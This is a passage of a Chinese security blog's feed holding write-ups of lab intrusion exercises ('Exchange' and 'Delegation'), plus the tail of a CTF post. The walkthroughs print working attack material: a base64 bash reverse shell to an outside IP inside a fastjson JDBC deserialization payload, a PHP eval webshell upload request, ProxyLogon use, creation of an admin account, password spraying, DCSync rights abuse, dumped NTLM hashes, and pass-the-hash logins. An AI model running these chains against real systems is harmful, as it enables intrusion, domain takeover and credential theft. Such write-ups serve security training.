class="line">FLAG_MODE=M_SED</span><br><span class="line">if [ $&#123;ICQ_FLAG&#125; ];then</span><br><span class="line">    case $FLAG_MODE in</span><br><span class="line">        &quot;M_ECHO&quot;)</span><br><span class="line">            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            FILE_MODE=755 # ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½flagï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rootï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SED&quot;)</span><br><span class="line">            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SQL&quot;)</span><br><span class="line">            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">    echo [+] ICQ_FLAG OK   </span><br><span class="line">    unset ICQ_FLAG </span><br><span class="line">else</span><br><span class="line">    echo [!] no ICQ_FLAG</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset ICQ_FLAG</span><br><span class="line">rm -rf /etc/profile.d/pouchenv.sh</span><br><span class="line">rm -rf /etc/instanceInfo</span><br><span class="line">rm -rf /start.sh</span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">/usr/sbin/crond</span><br><span class="line"></span><br><span class="line">/usr/sbin/rsyslogd</span><br><span class="line"></span><br><span class="line">javac /root/flag.java</span><br><span class="line">nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line">nohup java -jar /root/upload.jar &gt;/dev/null &amp;</span><br><span class="line">sleep 1;</span><br><span class="line"></span><br><span class="line">rm /tmp/config.properties</span><br><span class="line"></span><br><span class="line">java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;</span><br><span class="line">exec tail -f /dev/null</span><br></pre></td></tr></table></figure><p>虽然单看 <code>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null</code></p><p>这里  flag是被删除了  但是呢这里并没有进行释放</p><p>和python的只open()不close()的原理是一样的 </p><p><img src="../images/image-20231017214957737.png" alt="image-20231017214957737"></p><p>那么我们就可以挨个爆破  直到得出结果</p><p>但是因为我们之前读取proc的是显示403的  这里可能过滤了这个  于是我们可以双重url编码进行绕过</p><p><code>proc/29/fd/6</code></p><p><img src="../images/image-20231017215251063.png" alt="image-20231017215251063"></p><p>当然了 这样也行</p><p><img src="../images/image-20231017215737664.png" alt="image-20231017215737664"></p><p>这都是非预期解  预期解是RCE</p><p>目前还没RCE的wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-unserialize-pro&quot;&gt;&lt;a href=&quot;#PHP-unserialize-pro&quot; class=&quot;headerlink&quot; title=&quot;PHP_unserialize_pro&quot;&gt;&lt;/a&gt;PHP_unserialize_pro&lt;/h2&gt;&lt;figu</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Exchange</title>
    <link href="https://ke1nys.github.io/posts/47d3d323.html"/>
    <id>https://ke1nys.github.io/posts/47d3d323.html</id>
    <published>2023-10-16T12:11:34.000Z</published>
    <updated>2023-10-20T14:12:45.768Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231016201318668.png" alt="image-20231016201318668"></p><p>8000端口有一个<code>Lumia ERP</code></p><p>这里的话是存在一个弱口令的 <code>admin/123456</code>   用别的方法其实也行  存在一个信息泄露</p><p><img src="../images/image-20231016201518335.png" alt="image-20231016201518335"></p><p><img src="../images/image-20231016201537456.png" alt="image-20231016201537456"></p><p>于是登录后台  发现题目给了个<code>JDBC</code>的提示</p><p>于是查了一下  发现是fastjson的JDBC    <a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">JDBC-fastjson</a></p><p>然后跟着来打就行了</p><p>先下载一个Mysql-Fake   <a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a>   然后将<code>yso.jar</code>下载到这个MySQL文件夹里  并且修改config文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;config&quot;:&#123;</span><br><span class="line">            &quot;ysoserialPath&quot;:&quot;ysoserial-all.jar&quot;,</span><br><span class="line">            &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">            &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">            &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">            &quot;saveToFile&quot;:true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fileread&quot;:&#123;</span><br><span class="line">            &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">            &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">            &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">            &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">            &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">            &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">            &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">            &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;yso&quot;:&#123;</span><br><span class="line">            &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">            &quot;CommonsCollections6&quot;:[&quot;CommonsCollections6&quot;,&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行<code>server.py</code>文件</p><p><img src="../images/image-20231016202349848.png" alt="image-20231016202349848"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;101.42.39.110&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: &#123; &quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>传的时候记得url编码</p><p><img src="../images/image-20231016202441457.png" alt="image-20231016202441457"></p><p>这个shell一来就是root权限  好家伙</p><p>直接找flag就行了</p><p>这里的话我习惯在弹一个shell到msf上</p><p><img src="../images/image-20231016202922827.png" alt="image-20231016202922827"></p><p>然后上传工具扫内网了</p><p><img src="../images/image-20231016203003334.png" alt="image-20231016203003334"></p><p><img src="../images/image-20231016203232455.png" alt="image-20231016203232455"></p><p>总结一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.12   getshell主机</span><br><span class="line"> </span><br><span class="line">172.22.3.2   win16 DC域控</span><br><span class="line"></span><br><span class="line">172.22.3.9  EXC01  ---exchange01  outlook  windows</span><br><span class="line"></span><br><span class="line">172.22.3.26  域内主机 XIAORANG\XIAORANG-PC</span><br></pre></td></tr></table></figure><p>然后搭建代理隧道</p><p>先去访问这个exchange</p><p><img src="../images/image-20231016203618197.png" alt="image-20231016203618197"></p><p>这里发现是exchange server 2016 然后直接就去用ProxyLogon来打    <a href="https://github.com/hausec/ProxyLogon">https://github.com/hausec/ProxyLogon</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204117998.png" alt="image-20231016204117998"></p><p>给的是system权限  </p><p><img src="../images/image-20231016204239171.png" alt="image-20231016204239171"></p><p>发现3389端口还开着  新创建一个本地管理员账户进行rdp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204708760.png" alt="image-20231016204708760"></p><p>直接去拿flag就行了  </p><p>因为我们现在是本地管理员账户 不是域内账户  为了hashdump  得弹个shell</p><p>因为我们之前获取到了system的shell 直接传个马上去  然后shell执行  以system权限反弹</p><p><img src="../images/image-20231016205412245.png" alt="image-20231016205412245"></p><p><img src="../images/image-20231016205422234.png" alt="image-20231016205422234"></p><p><img src="../images/image-20231016205457506.png" alt="image-20231016205457506"></p><p>直接拿下exchange这台机器</p><p>然后开始查看域内hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Ke1nys:1000:aad3b435b51404eeaad3b435b51404ee:6912928308e3cda903e6d75bd6091a20:::</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username              Domain          NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------              ------          ----                              ----                                      -----</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        455badfb0e1e1d3ecad7d3f49199bbf4  359551c1705616dabc7d48d1163c8ea07701d8b1  312f49d92f1db5ad776f4d2d57c6ccff</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        8946a14d33bf2fa6542c2d9980c3af21  153ca12269ffae16f0475fb8b4532a647c05c11a  f58fb0f7fc11355abf57fe3b7a581bd7</span><br><span class="line">Ke1nys                XIAORANG-EXC01  6912928308e3cda903e6d75bd6091a20  4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        172701e17477920ff7097626eaeb0ea7  c473f34cecfc9d6b0481d79ee031c8c4dfc27a20</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        9587463cfa3fd1ea760c401e2c52e224  162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">Zhangtong             XIAORANG        22c7f81993e96ac83ac2f3f1903de8b4  4d205f752e28b0a13e7a2da2a956d46cb9d9e01e  ed14c3c4ef895b1d11b04fb4e56bb83b</span><br></pre></td></tr></table></figure><p>这里的话直接使用Viper的msf直接进入shell  然后直接执行<code>sharphound.exe</code>就行了</p><p><img src="../images/image-20231016211207064.png" alt="image-20231016211207064"></p><p><img src="../images/image-20231016210754387.png" alt="image-20231016210754387" style="zoom:50%;" /></p><p><img src="../images/image-20231016211040130.png" alt="image-20231016211040130"></p><p>拖到域内分析就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u xiaorang-exc01 --hashes &quot;aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d&quot; -d xiaorang.lab -dc xiaorang-win16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p>这个命令的话  好像得是获取到机器的hash值才行   mimikatz 的sekurlsa::logonpasswords 可以导出机器的hash</p><p><strong>(注册表也可以)</strong></p><p><img src="../images/image-20231016211513614.png" alt="image-20231016211513614"></p><p>发现这个机器账户具有writeDacl的功能  并且是对admins这个组的  这个组还具有域管的权限  说明我们可以写域管权限的acl了  </p><blockquote><p>ACL就是访问控制  可以指派xxx具有xxx权限</p></blockquote><p>这里的话我们就直接给ZHANGTONG这个用户DCSync权限  </p><p>有两种方法 </p><ul><li>第一种是使用impacket里的dacledit.py</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>但是这里我使用的话报错 </p><p>所以我选择第二种方法</p><ul><li>第二种是选择</li></ul><p><strong>bloodAD</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodyAD -d xiaorang.lab -u &#x27;XIAORANG-EXC01$&#x27; -p :172701e17477920ff7097626eaeb0ea7 --host 172.22.3.2 add dcsync Zhangtong</span><br></pre></td></tr></table></figure><p>这里的这个hash值是机器的hash值  因为根据sharphound的分析  发现是这个这个机器账户才有这个权限</p><p><img src="../images/image-20231016213037029.png" alt="image-20231016213037029"></p><p>然后使用脚本直接执行DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure><p>这里使用的是Zhangtong用户的hash值    这个脚本在impacket里就有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:8faefce446279aec0f176a8315b3fec7:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:8946a14d33bf2fa6542c2d9980c3af21:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:56b000c4417c31ada3ba7d3a655d6862:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:172701e17477920ff7097626eaeb0ea7:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:81d92fdc7be4bcb8cdf9155bc40a8a31:::</span><br></pre></td></tr></table></figure><p>域控hash拿到  直接psexec连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.2</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016213514443.png" alt="image-20231016213514443"></p><p>拿下域控的flag  最后一个flag的话是在exchange的邮件里面</p><p>是在Lumia用户的桌面上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016214338998.png" alt="image-20231016214338998"></p><p>这里别人能执行成功  我执行报错  就不研究了  去看别人wp就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231016201318668.png&quot; alt=&quot;image-20231016201318668&quot;&gt;&lt;/p&gt;
&lt;p&gt;8000端口有一个&lt;code&gt;Lumia ERP&lt;/code&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delegation</title>
    <link href="https://ke1nys.github.io/posts/bdc052b9.html"/>
    <id>https://ke1nys.github.io/posts/bdc052b9.html</id>
    <published>2023-10-10T10:15:40.000Z</published>
    <updated>2023-10-20T14:12:45.767Z</updated>
    
    <content type="html"><![CDATA[<p>fscan开扫</p><p><img src="../images/image-20231010192348417.png" alt="image-20231010192348417"></p><p><img src="../images/image-20231010192404021.png" alt="image-20231010192404021"></p><p>扫描发现后台<code>/admin</code></p><p>弱口令登录</p><p><code>admin/123456</code></p><p><img src="../images/image-20231010192457210.png" alt="image-20231010192457210"></p><p>在后台登录时就已经看到了这个cms的版本后 于是google一下</p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012 </a>    后台RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.98.127.31</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=m9fbpga5avq5itn03q12h5ldkk; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST[1]);phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//Response </span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010192848064.png" alt="image-20231010192848064"></p><p>成功写入  直接反弹shell到主机的vps上</p><p>flag在home目录下  在读取的时候发现这个权限不够 于是尝试开始提权</p><p><img src="../images/image-20231010193138271.png" alt="image-20231010193138271"></p><p>这个diff去查一下</p><p><img src="../images/image-20231010193210058.png" alt="image-20231010193210058"></p><p><img src="../images/image-20231010193303330.png" alt="image-20231010193303330"></p><p>这里给了个机器账户的本地账户</p><p>先去扫下内网</p><p><img src="../images/image-20231010193645120.png" alt="image-20231010193645120"></p><p>资源整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.36  getshell主机</span><br><span class="line"></span><br><span class="line">172.22.4.7  域控主机DC01</span><br><span class="line"></span><br><span class="line">172.22.4.45  域内主机 WIN19</span><br><span class="line"></span><br><span class="line">172.22.4.19 FILESERVER </span><br></pre></td></tr></table></figure><p>先搭建隧道  这里使用的是stowaway</p><p>然后根据第一个提示  给了WIN19的本地账户WIN19\Adrian  于是猜测需要去爆破  因为是本地账户  所以不能使用<code>kerbrute</code>来进行爆破  于是我们尝试使用<code>crackmapexec</code>来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">//使用前提还是开了139  445的端口前提下 -h可以查看允许爆破类型</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010194545801.png" alt="image-20231010194545801"></p><blockquote><p>WIN19\Adrian     babygirl1</p></blockquote><p>尝试rdp一下  因为前面开了这个3389端口来</p><p><img src="../images/image-20231010194733741.png" alt="image-20231010194733741"></p><p>提示密码过期 这里本来是想用<code>smbpasswd.py</code>来进行更改的  但是发现不行这里  估计是本地用户的原因</p><p><strong>于是发现了kali的<code>rdesktop</code>可以无密码登录</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010200954046.png" alt="image-20231010200954046"></p><p>修改密码后成功登录</p><p>发现桌面上多了个文件夹</p><p><img src="../images/image-20231010201116640.png" alt="image-20231010201116640"></p><p>里面的一个html文件的内容  <strong>只要是这个计算机的用户都可以权限对注册表进行操作</strong></p><p><strong>这里在之前试了一下  发现可以直接修改注册表  改成自己的生成的木马的地址  也能返回到system权限</strong></p><p><strong>但是这里的话用这个方法获取不到这个机器的hash值  不能进行下一步操作了  因为只有这个机器在域内  其他用户都不在</strong></p><p>于是这里的话我们先生成一个exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe 